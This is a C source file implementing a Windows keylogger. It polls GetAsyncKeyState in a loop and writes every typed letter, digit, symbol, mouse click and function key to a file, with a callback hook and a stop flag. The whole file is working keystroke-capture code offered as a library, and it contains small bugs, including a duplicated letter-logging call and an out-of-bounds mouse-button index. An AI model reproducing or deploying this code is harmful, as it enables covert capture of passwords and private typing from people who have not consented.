/******************************************************************************************************
 * @file key_logger.c                                                                                 *
 * @date:      @author:                   Reason for change:                                          *
 * 08.08.2023  Gaina Stefan               Initial version.                                            *
 * @details This file implements the interface defined in key_logger.h.                               *
 * @todo N/A.                                                                                         *
 * @bug No known bugs.                                                                                *
 *****************************************************************************************************/

/******************************************************************************************************
 * HEADER FILE INCLUDES                                                                               *
 *****************************************************************************************************/

#include <windows.h>
#include <winuser.h>

#include "key_logger.h"

/******************************************************************************************************
 * MACROS                                                                                             *
 *****************************************************************************************************/

/**
 * @brief 2 byte sized (short) value with all bits set to 1. This is the returned value of
 * GetAsyncKeyState when the requested key was pressed since the last call.
*/
#define SHORT_ALL_BITS_SET (SHORT)-0b111111111111111

/******************************************************************************************************
 * LOCAL VARIABLES                                                                                    *
 *****************************************************************************************************/

/**
 * @brief Flag indicating if the key logger is running.
*/
static bool is_key_logger_running = false;

/******************************************************************************************************
 * LOCAL FUNCTIONS                                                                                    *
 *****************************************************************************************************/

/**
 * @brief Logs all the keys that are being pressed.
 * @param[in] file: File where the keys are logged.
 * @param written_characters: How many characters have been already written to the line.
 * @param maximum_characters_per_line: If this amount is reached will print endline and reset counter.
 * @return Written characters to line count.
*/
static uint8_t log_keys(FILE* file, uint8_t written_characters, uint8_t maximum_characters_per_line);

/**
 * @brief Logs the letter (a - z) including capital letters.
 * @param[in] file: File where the keys are logged.
 * @param written_characters: How many characters have been already written to the line.
 * @param maximum_characters_per_line: If this amount is reached will print endline and reset counter.
 * @param is_shift_down: true - SHIFT is being pressed | false - otherwise.
 * @return Written characters to line count.
*/
static uint8_t log_letters(FILE* file, uint8_t written_characters, uint8_t maximum_characters_per_line, bool is_shift_down);

/**
 * @brief Logs the digits (0 - 9) including their pair when SHIFT is being pressed.
 * @param[in] file: File where the keys are logged.
 * @param written_characters: How many characters have been already written to the line.
 * @param maximum_characters_per_line: If this amount is reached will print endline and reset counter.
 * @param is_shift_down: true - SHIFT is being pressed | false - otherwise.
 * @return Written characters to line count.
*/
static uint8_t log_digits(FILE* file, uint8_t written_characters, uint8_t maximum_characters_per_line, bool is_shift_down);

/**
 * @brief Logs the special characters that have 2 forms when SHIFT is being pressed (besides digits).
 * @param[in] file: File where the keys are logged.
 * @param written_characters: How many characters have been already written to the line.
 * @param maximum_characters_per_line: If this amount is reached will print endline and reset counter.
 * @param is_shift_down: true - SHIFT is being pressed | false - otherwise.
 * @return Written characters to line count.
*/
static uint8_t log_special_characters(FILE* file, uint8_t written_characters, uint8_t maximum_characters_per_line, bool is_shift_down);

/**
 * @brief Logs the rest of the buttons.
 * @param[in] file: File where the keys are logged.
 * @param written_characters: How many characters have been already written to the line.
 * @param maximum_characters_per_line: If this amount is reached will print endline and reset counter.
 * @return Written characters to line count.
*/
static uint8_t log_auxiliary_buttons(FILE* file, uint8_t written_characters, uint8_t maximum_characters_per_line);

/**
 * @brief Checks if the new message will exceed the maximum length.
 * @param[in] file: File where the endline will be written.
 * @param written_characters: How many characters have been already written to the line.
 * @param maximum_characters_per_line: If this amount is reached will print endline and reset counter.
 * @param message_length: The length of the string that will be added.
 * @return Written characters to line count.
*/
static uint8_t check_maximum_length(FILE* file, uint8_t written_characters, uint8_t maximum_characters_per_line, uint8_t message_length);

/******************************************************************************************************
 * FUNCTION DEFINITIONS                                                                               *
 *****************************************************************************************************/

bool key_logger_run(FILE* const file)
{
	return key_logger_run_custom(file, 10UL, 0U, NULL, NULL);
}

bool key_logger_run_custom(FILE* const file, const uint32_t sleep_time, const uint8_t maximum_characters_per_line, key_logger_Callback_t const callback, void* const callback_data)
{
	uint8_t written_characters = 0U;

	if (NULL == file || true == is_key_logger_running)
	{
		return false;
	}

	is_key_logger_running = true;
	while (true == is_key_logger_running)
	{
		written_characters = log_keys(file, written_characters, maximum_characters_per_line);
		(void)fflush(file);

		if (NULL != callback)
		{
			(*callback)(callback_data);
		}

		Sleep((DWORD)sleep_time);
	}

	return true;
}

void key_logger_stop(void)
{
	is_key_logger_running = false;
}

bool key_logger_is_running(void)
{
	return is_key_logger_running;
}

static uint8_t log_keys(FILE* const file, uint8_t written_characters, const uint8_t maximum_characters_per_line)
{
	const bool is_shift_down = 0 == GetAsyncKeyState(VK_SHIFT) ? false : true;

	written_characters = log_letters(file, written_characters, maximum_characters_per_line, is_shift_down);
	written_characters = log_letters(file, written_characters, maximum_characters_per_line, is_shift_down);
	written_characters = log_digits(file, written_characters, maximum_characters_per_line, is_shift_down);
	written_characters = log_special_characters(file, written_characters, maximum_characters_per_line, is_shift_down);
	written_characters = log_auxiliary_buttons(file, written_characters, maximum_characters_per_line);

	return written_characters;
}

static uint8_t log_letters(FILE* const file, uint8_t written_characters, const uint8_t maximum_characters_per_line, const bool is_shift_down)
{
	int32_t    key_code          = 0L;
	const bool is_caps_lock_down = 0 == (GetKeyState(VK_CAPITAL) & 0x0001) ? false : true;

	for (key_code = (int32_t)'A'; key_code <= (int32_t)'Z'; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 1U);
			if (((false == is_shift_down  && (false == is_caps_lock_down)))
			 || ((true  == is_shift_down) && (true  == is_caps_lock_down)))
			{
				(void)fprintf(file, "%c", (char)(key_code + (int32_t)'a' - (int32_t)'A'));
				continue;
			}
			(void)fprintf(file, "%c", (char)key_code);
		}
	}

	return written_characters;
}

static uint8_t log_digits(FILE* const file, uint8_t written_characters, const uint8_t maximum_characters_per_line, const bool is_shift_down)
{
	char              digits_character        = '\0';
	const char* const digits_shift_characters = ")!@#$%%^&*(";

	for (digits_character = '0'; digits_character <= '9'; ++digits_character)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState((int)digits_character))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 1U);
			(void)fprintf(file, "%c", false == is_shift_down ? digits_character : digits_shift_characters[digits_character - '0']);
		}
	}

	return written_characters;
}

static uint8_t log_special_characters(FILE* const file, uint8_t written_characters, const uint8_t maximum_characters_per_line, const bool is_shift_down)
{
	int32_t           key_code                  = 0L;
	const char* const special_characters1       = ";=,-./`";
	const char* const special_shift_characters1 = ":+<_>?~";
	const char* const special_characters2       = "[\\]\'";
	const char* const special_shift_characters2 = "{|}\"";

	for (key_code = VK_OEM_1; key_code <= VK_OEM_3; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 1U);
			(void)fprintf(file, "%c", false == is_shift_down ? special_characters1[key_code - VK_OEM_1] : special_shift_characters1[key_code - VK_OEM_1]);
		}
	}

	for (key_code = VK_OEM_4; key_code <= VK_OEM_7; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 1U);
			(void)fprintf(file, "%c", false == is_shift_down ? special_characters2[key_code - VK_OEM_4] : special_shift_characters2[key_code - VK_OEM_7]);
		}
	}

	return written_characters;
}

static uint8_t log_auxiliary_buttons(FILE* const file, uint8_t written_characters, const uint8_t maximum_characters_per_line)
{
	int32_t           key_code             = 0L;
	const char* const mouse_buttons[]      = { "[LMB]", "[RMB]" , "[MMB]" };
	const char* const auxiliary_buttons1[] = { "[BACK]", "[TAB]" };
	const char* const auxiliary_buttons2[] = { "[SPACE] ", "[PGUP]", "[PGDN]", "[END]", "[HOME]", "[ARROWL]", "[ARROWU]", "[ARROWR]", "[ARROWD]" };
	const char* const auxiliary_buttons3[] = { "[INS]", "[DEL]" };
	const char* const auxiliary_buttons4[] = { "[LWIN]", "[RWIN]", "[MENU]" };
	const char* const auxiliary_buttons5[] = { "[LCTRL]", "[RCTRL]", "[LALT]", "[RALT]" };
	const char* const functional_buttons[] = { "[F1]" , "[F2]" , "[F3]" , "[F4]" , "[F5]" , "[F6]" , "[F7]" , "[F8]" , "[F9]" , "[F10]", "[F11]", "[F12]",
											   "[F13]", "[F14]", "[F15]", "[F16]", "[F17]", "[F18]", "[F19]", "[F20]", "[F21]", "[F22]", "[F23]", "[F24]" };

	for (key_code = VK_LBUTTON; key_code <= VK_RBUTTON; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 5U);
			(void)fprintf(file, "%s", mouse_buttons[key_code - VK_LBUTTON]);
		}
	}

	if (SHORT_ALL_BITS_SET == GetAsyncKeyState(VK_MBUTTON))
	{
		written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 5U);
		(void)fprintf(file, "%s", mouse_buttons[3]);
	}

	for (key_code = VK_BACK; key_code <= VK_TAB; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, (uint8_t)strlen(auxiliary_buttons1[key_code - VK_BACK]));
			(void)fprintf(file, "%s", auxiliary_buttons1[key_code - VK_BACK]);
		}
	}

	if (SHORT_ALL_BITS_SET == GetAsyncKeyState(VK_RETURN))
	{
		written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 7U);
		(void)fprintf(file, "[ENTER]");
	}

	if (SHORT_ALL_BITS_SET == GetAsyncKeyState(VK_SHIFT))
	{
		written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 7U);
		(void)fprintf(file, "[SHIFT]");
	}

	if (SHORT_ALL_BITS_SET == GetAsyncKeyState(VK_ESCAPE))
	{
		written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 5U);
		(void)fprintf(file, "[ESC]");
	}

	for (key_code = VK_SPACE; key_code <= VK_UP; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, (uint8_t)strlen(auxiliary_buttons2[key_code - VK_SPACE]));
			(void)fprintf(file, "%s", auxiliary_buttons2[key_code - VK_SPACE]);
		}
	}

	for (key_code = VK_INSERT; key_code <= VK_DELETE; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 5U);
			(void)fprintf(file, "%s", auxiliary_buttons3[key_code - VK_INSERT]);
		}
	}

	for (key_code = VK_LWIN; key_code <= VK_APPS; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, 6U);
			(void)fprintf(file, "%s", auxiliary_buttons4[key_code - VK_LWIN]);
		}
	}

	for (key_code = VK_LCONTROL; key_code <= VK_RMENU; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, (uint8_t)strlen(auxiliary_buttons5[key_code - VK_LCONTROL]));
			(void)fprintf(file, "%s", auxiliary_buttons5[key_code - VK_LCONTROL]);
		}
	}

	for (key_code = VK_F1; key_code <= VK_F24; ++key_code)
	{
		if (SHORT_ALL_BITS_SET == GetAsyncKeyState(key_code))
		{
			written_characters = check_maximum_length(file, written_characters, maximum_characters_per_line, (uint8_t)strlen(functional_buttons[key_code - VK_F1]));
			(void)fprintf(file, "%s", functional_buttons[key_code - VK_F1]);
		}
	}

	return written_characters;
}

static uint8_t check_maximum_length(FILE* const file, const uint8_t written_characters, const uint8_t maximum_characters_per_line, const uint8_t message_length)
{
	if ((uint16_t)written_characters + (uint16_t)message_length > (const uint16_t)maximum_characters_per_line && 0U != maximum_characters_per_line)
	{
		(void)fprintf(file, "\n");
		return message_length;
	}

	return written_characters + message_length;
}
